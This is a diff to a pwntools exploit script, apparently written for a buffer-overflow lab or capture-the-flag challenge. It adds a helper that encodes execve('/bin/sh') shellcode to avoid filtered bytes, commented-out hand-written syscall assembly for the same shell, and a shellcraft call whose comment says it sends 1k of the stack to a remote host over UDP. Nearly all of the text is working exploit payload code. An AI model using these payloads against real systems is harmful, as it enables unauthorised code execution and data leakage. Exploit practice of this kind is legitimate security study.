@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from pwn import *
+from pwnlib import flexshell
 
 context(arch = 'amd64', os='linux')
 
@@ -11,17 +12,51 @@ bufflen = 168
 # New shellcraft functionality:
 # 
 #   shellcraft.updpeer() - Sends 1k of the stack to a remote host
+#   via UDP.
 #
 ##################################################################
 shellcode = shellcraft.udppeer('127.0.0.1',55555)
 ##################################################################
 
-shellcode = asm(shellcode)
+
+##################################################################
+# New shellcraft functionality:
+# 
+#   shellcraft.flexshell() - Removes unwanted bytes from shellcode.
+#
+##################################################################
+##################################################################
+#avoid = b'/bin/sh\x00'
+#shellcode = shellcraft.flexshell(shellcode, avoid)
+##################################################################
 
 
-print(len(shellcode))
+
+##################################################################
+#shellcode = flexshell.nobinsh()
+##################################################################
+##################################################################
+avoid = b'/bin/sh\x00'
+shellcode = flexshell.flex(asm(shellcraft.sh()), avoid)
+##################################################################
+##################################################################
+#shellcode = asm('mov rax, 0x3b')
+#shellcode += asm('pushq 0')
+#shellcode += asm('mov rdx, rsp')
+#shellcode += asm('mov rsi, rsp')
+#shellcode += asm('mov r10, 0x68732f6e6922f')
+#shellcode += asm('push r10')
+#shellcode += asm('mov rdi, rsp')
+#shellcode += asm('syscall')
+
+#avoid = b'/bin///sh\x00'
+#avoid = b'\x00' 
+#shellcode = flexshell.flex(shellcode, avoid)
+##################################################################
+print(shellcode)
 
 sclen = len(shellcode)
+print(sclen)
 
 p.recvuntil(b': ')
 buff_addr_str = p.recvlines(1)
